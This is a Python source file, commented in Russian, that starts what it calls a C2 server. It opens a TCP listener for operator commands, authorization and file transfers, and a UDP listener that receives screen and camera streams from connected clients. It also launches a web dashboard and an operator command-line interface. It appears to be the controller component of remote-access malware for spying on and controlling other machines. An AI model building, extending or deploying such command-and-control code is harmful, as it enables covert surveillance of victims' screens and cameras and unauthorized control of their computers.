import asyncio
import multiprocessing
import webbrowser
from logs import Log as logger
from backend import IP, PORT, API_PORT
from backend.API import run_fastapi_server
from .ClientConnection import client_handler
from backend.CLI.CLI import operator_interface, print_c2_ready_message
from backend import start_benchmark
from backend.API.api import manager  # Импорт для доступа к рассылке


# ==========================================
# 1-й БЛОК: UDP СЕРВЕР ДЛЯ ПОТОКОВЫХ ДАННЫХ
# ==========================================
class StreamingUDPProtocol(asyncio.DatagramProtocol):
    def datagram_received(self, data, addr):
        if len(data) < 6: return

        # Вместо создания задачи, вызываем функцию напрямую
        # manager.broadcast_packet должен быть обычным методом (не async),
        # либо использовать call_soon
        manager.broadcast_packet_sync(data)

# ==========================================
# 2-й БЛОК: TCP СЕРВЕР ДЛЯ ТОЧНЫХ ДАННЫХ
# ==========================================
async def start_server():
    log_queue = multiprocessing.Queue()

    # 1. TCP Сервер (Команды, Авторизация, Файлы)
    server = await asyncio.start_server(
        lambda r, w: client_handler(r, w),
        IP, PORT,
        reuse_address=True,
        backlog=1000
    )

    # 2. UDP Сервер (Стриминг экрана и камеры) на ТОМ ЖЕ порту
    loop = asyncio.get_running_loop()
    udp_transport, udp_protocol = await loop.create_datagram_endpoint(
        lambda: StreamingUDPProtocol(),
        local_addr=(IP, PORT)
    )

    addr = server.sockets[0].getsockname()
    logger.info(f"[+] TCP Server started on {addr}")
    logger.info(f"[+] UDP Stream Listener active on {IP}:{PORT}")

    # Задачи сервера
    log_task = asyncio.create_task(logger.start_queue_listener(log_queue))
    api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))
    cli_task = asyncio.create_task(operator_interface(server))

    start_benchmark(asyncio.get_running_loop(), interval=1)
    webbrowser.open(f"http://{IP}:{API_PORT}/")
    print_c2_ready_message()

    async with server:
        try:
            await asyncio.gather(
                server.serve_forever(),
                log_task,
                api_task,
                cli_task
            )
        except asyncio.CancelledError:
            logger.info("[*] Server shutdown initiated.")
        finally:
            udp_transport.close()  # Закрываем UDP
            log_queue.put("STOP")
            api_task.cancel()
            cli_task.cancel()
            await asyncio.gather(log_task, api_task, cli_task, return_exceptions=True)
            logger.info("[*] Server stopped.")